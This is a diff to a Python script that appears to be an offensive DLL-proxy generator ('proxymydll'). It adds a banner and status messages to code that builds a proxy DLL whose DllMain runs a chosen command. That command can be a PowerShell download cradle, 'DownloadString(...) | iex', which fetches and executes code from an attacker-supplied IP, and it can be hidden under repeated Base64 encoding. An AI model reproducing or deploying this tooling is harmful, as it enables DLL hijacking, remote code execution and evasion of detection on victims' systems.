@@ -4,6 +4,35 @@ import os
 import sys
 import base64
 
+# =======================
+#       ASCII BANNER
+# =======================
+
+banner = r"""
+ __  __  __ 
+/  |/  |/  |
+  ______    ______    ______   __    __  __    __  _____  ____   __    __   ____$$ |$$ |$$ |
+ /      \  /      \  /      \ /  \  /  |/  |  /  |/     \/    \ /  |  /  | /    $$ |$$ |$$ |
+/$$$$$$  |/$$$$$$  |/$$$$$$  |$$  \/$$/ $$ |  $$ |$$$$$$ $$$$  |$$ |  $$ |/$$$$$$$ |$$ |$$ |
+$$ |  $$ |$$ |  $$/ $$ |  $$ | $$  $$<  $$ |  $$ |$$ | $$ | $$ |$$ |  $$ |$$ |  $$ |$$ |$$ |
+$$ |__$$ |$$ |      $$ \__$$ | /$$$$  \ $$ \__$$ |$$ | $$ | $$ |$$ \__$$ |$$ \__$$ |$$ |$$ |
+$$    $$/ $$ |      $$    $$/ /$$/ $$  |$$    $$ |$$ | $$ | $$ |$$    $$ |$$    $$ |$$ |$$ |
+$$$$$$$/  $$/        $$$$$$/  $$/   $$/  $$$$$$$ |$$/  $$/  $$/  $$$$$$$ | $$$$$$$/ $$/ $$/ 
+$$ |                                    /  \__$$ |              /  \__$$ |                  
+$$ |                                    $$    $$/               $$    $$/                  
+$$/                                      $$$$$$/                 $$$$$$/                  
+
+by: cOnfig                  Resource: https://github.com/c0nfig-17/proxymydll
+forked of: mrexodia         Resource: https://github.com/mrexodia/perfect-dll-proxy
+"""
+
+print(banner)
+
+
+# =======================
+#   YOUR ORIGINAL CODE
+# =======================
+
 def encode_ps(cmd):
     """Encode command in Base64 UTF-16LE for PowerShell -enc."""
     return base64.b64encode(cmd.encode("utf-16le")).decode()
@@ -46,19 +75,27 @@ def main():
     user_downexe: str = args.downexe
     enc_depth: int = args.enc
 
-    # PRIORITY SYSTEM
+    # PRIORITY SYSTEM (NO CAMBIADO)
     if user_downexe:
         user_cmd = (
             f"(New-Object System.Net.WebClient).DownloadString('http://{user_ip}/{user_downexe}') | iex"
         )
+        mode = "downexe"
+
     elif user_down:
         user_cmd = (
             f"(New-Object System.Net.WebClient).DownloadString('http://{user_ip}/{user_down}')"
         )
-    elif user_cmd is None:
-        user_cmd = "echo NoCommandProvided"
+        mode = "down"
 
-    # Apply recursive encoding if enabled
+    elif user_cmd is not None:
+        mode = "cmd"
+
+    else:
+        user_cmd = "echo NoCommandProvided"
+        mode = "none"
+
+    # ENCODING — NO CAMBIADO
     if enc_depth:
         final_ps = recursive_encode_ps(user_cmd, enc_depth)
         final_cmd = f"cmd.exe /c {final_ps}"
@@ -174,6 +211,27 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
     return TRUE;
 }}
 """)
+
+    # ===============================================
+    #         DESCRIPTIVE OUTPUT SECTION
+    # ===============================================
+
+    print(f"[ + ] File provided: {dll}")
+
+    if mode == "cmd":
+        print(f"[ + ] Command execution injected: \"{args.cmd}\"")
+
+    if mode == "down":
+        print(f"[ + ] Download from: http://{user_ip}/{user_down}")
+
+    if mode == "downexe":
+        print(f"[ + ] Download & executed from: http://{user_ip}/{user_downexe}")
+
+    if enc_depth:
+        print(f"[ + ] {enc_depth} times encoded in Base64")
+
+    print(f"[ + ] Output file successfully created: {output}")
+
 
 if __name__ == "__main__":
     main()
